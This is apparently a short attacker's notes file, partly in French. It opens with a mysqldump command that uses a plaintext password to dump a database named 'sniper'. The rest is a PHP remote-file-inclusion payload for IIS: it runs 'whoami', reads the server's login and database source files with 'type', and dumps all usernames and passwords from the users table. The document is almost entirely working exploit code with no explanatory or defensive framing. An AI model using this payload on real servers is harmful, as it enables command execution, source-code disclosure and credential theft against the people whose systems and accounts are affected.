### php mysql IIS

cd “C:\Program Files\MySql\MySQL Server 8.0\bin”
./mysqldump.exe -h 127.0.0.1 -P 3306 -u dbuser -p 36mEAhz/B8xQ~2VM  -q sniper > c:\tmp\r.db


=========
OU
=========

Exploit d'une RFI sur IIS (lecture de repertoire puis requete mysql)


<?php

echo system('whoami');
echo system('type ..\user\login.php');
echo system('type ..\user\db.php');
echo system('type ..\user\registration_old123123123847.php');



session_start();

$query = "SELECT * FROM `users`";
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }

$result = mysqli_query($con,$query) or die(mysql_error());
echo "======================================================";
$rows = mysqli_num_rows($result);
echo $rows;
while($row = $result->fetch_assoc()) {
        echo "<tr><td>".$row["id"]."</td><td>".$row["username"]." ".$row["password"]."</td></tr>";
    }
echo "-------------------------------------------------------";

?>



